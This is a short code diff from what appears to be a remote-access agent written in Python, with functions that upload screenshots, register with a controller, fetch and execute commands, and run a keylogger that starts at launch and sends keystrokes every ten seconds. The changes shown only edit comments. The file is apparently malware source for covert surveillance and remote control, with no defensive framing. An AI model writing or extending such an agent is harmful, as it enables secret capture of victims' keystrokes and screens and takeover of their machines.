@@ -88,7 +88,7 @@ def upload_screenshot(b64data):
         print(f"[!] Screenshot upload error: {e}")
 
 
-# Keylogger logic (same as Linux)
+# Keylogger logic 
 keylogger_running = False
 keylogger_buffer = []
 keylogger_thread = None
@@ -254,11 +254,11 @@ def fetch_and_execute():
 
 if __name__ == "__main__":
     register_agent()
-    start_keylogger()  # Start keylogger immediately
+    start_keylogger()  
     last_sent = time.time()
     while True:
         fetch_and_execute()
-        # Send keylog every 10 seconds
+        # Keylogsending in ecery 10 sec
         if time.time() - last_sent > 10:
             stop_keylogger()
             start_keylogger()
